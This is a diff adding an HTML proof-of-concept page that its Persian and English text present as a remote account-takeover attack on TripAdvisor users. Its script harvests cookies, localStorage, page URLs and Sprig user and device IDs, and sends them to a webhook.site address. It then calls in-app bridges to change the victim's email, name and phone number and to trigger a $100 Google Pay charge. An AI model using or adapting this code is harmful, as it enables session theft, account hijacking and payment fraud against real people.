@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TripAdvisor Critical PoC - Remote ATO</title>
+    <style>body{font-family:system-ui;background:#111;color:#0f0;padding:20px}</style>
+</head>
+<body>
+    <h1>🚨 TripAdvisor Remote Critical PoC</h1>
+    <p id="status">در حال استخراج داده‌ها و اجرای bridge...</p>
+
+    <script>
+        const webhook = "https://webhook.site/4bf67eb4-518b-4bf3-acc4-a6f15851a6c4";
+
+        function exfil(data) {
+            fetch(webhook, {
+                method: "POST",
+                body: JSON.stringify(data),
+                mode: "no-cors"
+            });
+            const img = new Image();
+            img.src = webhook + "?d=" + btoa(JSON.stringify(data));
+        }
+
+        setTimeout(() => {
+            console.log("%cFARHAD_CRITICAL_REMOTE_SUCCESS", "color:red;font-size:20px");
+
+            const d = {
+                sprigUserId: typeof Sprig !== "undefined" ? Sprig("getUserId") : null,
+                deviceId: typeof Sprig !== "undefined" ? Sprig("getAttribute", "deviceId") : null,
+                userAgent: navigator.userAgent,
+                referrer: document.referrer,
+                title: document.title,
+                location: location.href,
+                cookies: document.cookie || "no_cookie_access",
+                localStorage: JSON.stringify(localStorage || {}),
+                bridgeStatus: typeof brazeInternalBridge !== "undefined" ? "AVAILABLE" : "NOT_FOUND"
+            };
+
+            exfil(d);
+
+            // Bridge chaining برای تغییر پروفایل و پرداخت
+            if (typeof brazeInternalBridge !== "undefined") {
+                brazeInternalBridge.setEmail("hacked@farhad.com");
+                brazeInternalBridge.setFirstName("Hacked");
+                brazeInternalBridge.setLastName("ByFarhad");
+                brazeInternalBridge.setPhoneNumber("+989123456789");
+                console.log("BRAZE_PROFILE_CHANGED_SUCCESS");
+            }
+
+            if (typeof jsBridge !== "undefined") {
+                jsBridge.payWithGoogle("100", "USD", "fake_order_123");
+                console.log("JSBRIDGE_PAYMENT_TRIGGERED");
+            }
+
+            document.getElementById("status").innerHTML = 
+                "✅ PoC کامل اجرا شد!<br>" +
+                "داده‌ها به webhook ارسال شد<br>" +
+                "پروفایل تغییر کرد + پرداخت جعلی تریگر شد";
+        }, 1500);
+    </script>
+</body>
+</html>
